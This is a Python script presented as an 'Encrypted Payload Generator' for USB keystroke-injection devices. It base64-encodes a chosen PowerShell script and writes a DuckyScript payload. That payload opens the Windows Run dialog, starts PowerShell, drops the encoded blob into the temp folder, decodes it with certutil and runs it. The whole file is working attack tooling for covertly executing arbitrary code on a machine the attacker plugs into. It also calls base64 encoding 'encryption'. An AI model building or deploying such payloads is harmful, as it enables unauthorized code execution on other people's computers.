#!/bin/python3

import os
import subprocess
import re

def generate_payload(file_path, adv_mode=False, payload_title="", payload_description="", payload_author="", payload_version="", delay_amount=0):
    path = os.path.dirname(os.path.abspath(__file__))
    payload_filename = "gen_payload.tmp"
    temp_file = os.path.join(path, "temp.txt")
    final_file = os.path.join(path, "payload.txt")

    with open(temp_file, "w") as temp:
        subprocess.run(["base64", "-w", "0", file_path], stdout=temp)

    with open(temp_file, "r") as file:
        output = file.read().replace("\n", "")

    os.remove(temp_file)

    if os.path.exists(payload_filename):
        os.remove(payload_filename)

    with open(payload_filename, "w") as payload_file:
        if adv_mode:
            payload_file.write(f"REM Title      : {payload_title}\n")
            payload_file.write(f"REM Description: {payload_description}\n")
            payload_file.write(f"REM Author     : {payload_author}\n")
            payload_file.write(f"REM Version    : {payload_version}\n")
        payload_file.write("REM Scriptkiddiee's Encrypted Payload Generator\n")
        payload_file.write("REM - It is highly suggested you adjust the DELAYS for your use.\n")

        if adv_mode:
            payload_file.write("DUCKY_LANG US\n")

        payload_file.write("DELAY 2000\n")
        payload_file.write("GUI r\n")
        payload_file.write("DELAY 200\n")
        payload_file.write("STRING powershell\n")
        payload_file.write("DELAY 500\n")
        payload_file.write("ENTER\n")

        if adv_mode and file_path.lower().endswith(".ps1") and delay_amount != 0:
            payload_file.write("REM Custom DELAY added.\n")
            payload_file.write(f"DELAY {delay_amount}\n")
        else:
            payload_file.write("DELAY 500\n")

        script_extension = os.path.splitext(file_path)[1].lower()

        if script_extension == ".ps1":
            powershell_command = (
                'STRING $TempFile = "$env:TEMP\\temp.ps1"; '
                '$File = "$env:TEMP\\l.ps1"; '
                f'echo {output} > "$TempFile"; '
                'certutil -f -decode "$TempFile" "$File" | out-null; '
                '& "$env:TEMP\\l.ps1"\n'
            )
            payload_file.write(powershell_command)
            payload_file.write("DELAY 1000\n")
            payload_file.write("ENTER\n")

        else:
            print("The script is not a PowerShell (.ps1) file.")

    os.rename(payload_filename, final_file)
    print("\nPayload Generation Complete.\n")
    print(f"Location: {final_file}\n")

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="Scriptkidd's Encrypted Payload Generator")
    parser.add_argument("file_path", metavar="File_to_Encrypt", type=str, help="Path to the file to encrypt")
    parser.add_argument("-adv", action="store_true", help="Enable advanced mode")

    args = parser.parse_args()

    delay_amount = 0
    payload_title = ""
    payload_description = ""
    payload_author = ""
    payload_version = ""

    if args.adv:
        print("-- It is still recommended to edit the payload to set DELAY's correctly.\n")

        payload_title = input("Payload Title: ")
        payload_description = input("Payload Description: ")
        payload_author = input("Payload Author: ")
        payload_version = input("Payload Version: ")

        delay_input = input("Do you want to add a Custom DELAY in your Payload after Opening PowerShell? (y/N): ")
        if delay_input.lower() == "y":
            match = '^([1-9][0-9]{2,4})$'
            while not re.match(match, (delay_amount := input("Enter 3-5 digits for a Custom DELAY: "))):
                pass

    generate_payload(args.file_path, args.adv, payload_title, payload_description, payload_author, payload_version, delay_amount)
